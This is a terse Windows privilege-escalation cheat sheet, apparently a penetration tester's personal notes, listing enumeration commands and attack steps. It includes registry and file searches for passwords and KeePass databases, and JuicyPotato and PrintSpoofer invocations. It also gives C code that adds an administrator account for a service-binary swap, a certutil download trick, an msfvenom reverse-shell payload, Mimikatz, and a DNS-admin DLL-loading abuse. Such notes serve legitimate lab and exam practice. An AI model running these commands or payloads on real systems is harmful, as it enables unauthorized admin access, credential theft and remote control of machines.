#LIST OF THINGS WORTH CHECKING:
- Username and hostname |  whoami
- Group memberships of the current user | whoami /groups
- Existing users and groups | net user, Get-Localuser, Get-LocalGroup, Get-LocalGroupMember
- Operating system, version and architecture |systeminfo
- Network information | ipconfig /all, route print,netstat -ano
- Installed applications | Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
- Running processes  | Get-Process

#SEARCH FOR PASSWORD MANAGER DBs

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

#SEARCH FOR SENSITIVE XAMMP INFO:

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

#SEARCH HOME DIR

```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

whoami /priv
If you have SEImpersonate, USE JUICYPOTATO!!! NOW!!!


```
jp.exe -t * -p c:\users\tony\desktop\1234shell.exe -l 1337 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

IF THE WINDOWS BUILD IS TOO RECENT FOR THIS, TRY PRINT SPOOFER
https://github.com/itm4n/PrintSpoofer

```
PrintSpoofer64.exe -i -c cmd.exe
```

SEARCH FOR OPEN PORTS:
GOOD IF SOMETHING IS FIREWALLED OFF

```
netstat -nao
```

Search for Passwords:

```
reg query HKLM /f pass /t REG_SZ /s
```
PAY PARTICULAR ATTENTION TO THE ControlSet keys

WINPEAS

MANUAL PRIVESC ENUM!
net user [username] can provide a lot of info on different users permissions/group memberships

just running net user will show all users on the system.

At some point you may need to rely on kernel exploits, and knowing the machine's OS is useful here:
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

Get a list of running processes:

```
tasklist
```

Get a list of running services:

```
tasklist /SVC
```

```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```
NOTE:  You cannot see higher priv processes in windows

Search for unquoted service paths:

```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Use icacls to check folder permissions for service exes.

show firewall profile:

```
netsh advfirewall show currentprofile
```

```
netsh advfirewall firewall show rule name=all 
```

Check scheduled tasks:

```
schtasks /query /fo LIST /v
```

Enumerate Installed Programs:

```
wmic product get name, version, vendor
```

Enumerate WIndows Updates:
```
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

Check for folders/files Everyone can write to:
```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

List drivers:
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
```
```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} 
```

Check these reg keys:
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer 
```
```
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```
 -If either of these are set to 1, you can run any msi with elevated permissions.  Make an MSI and execute it.  There ya go
 
 -PRIVESC TECHNIQUES FOR WINDOWS-
 
 UAC Bypassing...
 
 Replace a service exe and either restart the service or reboot (shutdown /r /t 0) 
``` 
#include <stdlib.h> 

int main () 
{ 
int i; 

i = system ("net user evil Ev!lpass /add"); 
i = system ("net localgroup administrators evil /add"); 
    
return 0; 
}
```
Compile the C Program above, and you can use it to create a new admin user.
```
i686-w64-mingw32-gcc adduser.c -o adduser.exe
``` 

DON'T USE CURL IF YOU CAN HELP IT, TRY CERTUTIL:
```
certutil.exe -urlcache -split -f <http://FILE> <OUTPUTFILE>
```
Use Mimikatz lsadump
Consider searching for source code on weird web apps, see if you can find sections for usernames and passwords, then search on the machine.

https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
J-UICYPOTATO TOOL IF YOU HAVE SEIMPERSONATE
-\\[IP]\share\JuicyPotato.exe -l 4444 -p shell.bat -t *
-msfvenom -p cmd/windows/reverse_powershell LHOST=[IP] LPORT=4444 > shell.bat

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy



In PowerShell, ls is an alias for Get-ChildItem or gci. On windows, it’s often a good idea to run that with -force, kind of like running ls -a.

Weeeeeeeeeeeeeeeeeeeeeeeeeeeeird DNS thing if you are a DNS Admin:
dnscmd.exe /config /serverlevelplugindll \\path\to\dll